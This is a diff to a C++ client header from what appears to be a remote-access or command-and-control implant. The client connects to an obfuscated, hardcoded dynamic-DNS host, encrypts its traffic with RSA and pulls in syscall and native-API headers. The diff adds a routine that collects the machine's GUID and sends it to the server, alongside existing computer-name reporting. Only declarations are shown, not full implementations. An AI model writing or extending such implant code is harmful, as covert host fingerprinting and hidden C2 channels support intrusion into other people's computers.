@@ -3,15 +3,18 @@
 
 #include "framework.h"
 #include "net_types.h"
-#include "External/obfuscate.h"
 #include "net_common.h"
+#include "natives.h"
+#include "syscalls.h"
 
+#include "External/obfuscate.h"
 #include "External/base64.h"
 
 #include <memory>
 #include <algorithm>
 #include <random>
 #include <openssl/bio.h>
+#include <filesystem>
 
 #pragma comment( lib, "ws2_32.lib" )
 
@@ -21,6 +24,7 @@ const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
 class Client {
 public:
     std::string   ComputerName = "unknown";
+    std::string   MachineGUID  = "unknown";
 
 public:
 
@@ -32,29 +36,31 @@ public:
     inline void SetEncryptionKeys(RSAKeys keys) {
         this->Secrets.strPublicKey = keys.strPublicKey;
         this->Secrets.strPrivateKey = keys.strPrivateKey;
-    #ifdef SERVER_RELEASE
+#ifdef SERVER_RELEASE
         this->Secrets.bioPublicKey = keys.bioPublicKey;
         this->Secrets.bioPrivateKey = keys.bioPrivateKey;
-    #endif
+#endif
     }
 
-// Client only methods
+    // Client only methods
 #ifdef CLIENT_RELEASE
     Client();
     ~Client();
 
-	BOOL          Connect(); // Connect to the tcp server
+    BOOL          Connect(); // Connect to the tcp server
     BOOL          Disconnect(); // Disconnect from the tcp server
-    
+
     BYTESTRING    MakeTCPRequest(ClientRequest req, BOOL encrypted = FALSE); // send a message, receive the response
     BOOL          SendMessageToServer(Server dest, ClientMessage message, sockaddr_in udpAddr = NetCommon::_default);
     BOOL          SendEncryptedMessageToServer(Server dest, ClientMessage message);
-    
+
     template <typename _Ty>
     BOOL          ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr);
     BOOL          GetPublicRSAKeyFromServer();
     BOOL          SendComputerNameToServer();
+    BOOL          SendMachineGUIDToServer();
     void          InsertComputerName();
+    void          GetMachineGUID();
 
 // Server only client implementation
 #elif defined(SERVER_RELEASE)
